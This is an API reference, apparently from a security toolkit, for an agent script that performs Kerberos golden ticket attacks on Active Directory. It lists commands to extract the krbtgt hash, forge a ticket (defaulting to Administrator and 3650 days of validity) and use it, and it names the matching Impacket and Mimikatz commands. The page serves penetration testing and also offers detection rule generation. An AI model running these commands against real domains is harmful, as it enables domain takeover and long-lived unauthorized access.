<!-- Copyright (c) 2026 defconxt. All rights reserved. -->
<!-- Licensed under AGPL-3.0 — see LICENSE file for details. -->
<!-- CIPHER is a trademark of defconxt. -->
# performing-golden-ticket-attacks — API Reference

## Agent Script

| Command | Description |
|---------|-------------|
| `extract --domain <fqdn> --dc-ip <ip>` | Extract krbtgt hash and domain SID |
| `forge --domain <fqdn> --domain-sid <sid> --krbtgt-hash <hash>` | Forge golden ticket |
| `validate --domain <fqdn> --dc-ip <ip>` | Validate domain-wide access |
| `detect --domain <fqdn> --dc-ip <ip>` | Generate detection rules |

## Parameters

| Parameter | Type | Required | Description |
|-----------|------|----------|-------------|
| `--domain` | string | Yes | Target AD domain FQDN |
| `--dc-ip` | string | Yes | Domain controller IP address |
| `--domain-sid` | string | Yes (forge) | Domain SID (S-1-5-21-...) |
| `--krbtgt-hash` | string | Yes (forge) | krbtgt NTLM hash |
| `--user` | string | No | User to impersonate (default: Administrator) |
| `--duration` | int | No | Ticket validity in days (default: 3650) |

## External Tool Reference

| Tool | Command | Purpose |
|------|---------|---------|
| Impacket | `impacket-ticketer -nthash <hash> -domain-sid <sid>` | Forge golden ticket |
| Mimikatz | `kerberos::golden /krbtgt:<hash> /ptt` | Windows golden ticket |
| Impacket | `impacket-psexec -k -no-pass <target>` | Use ticket for access |
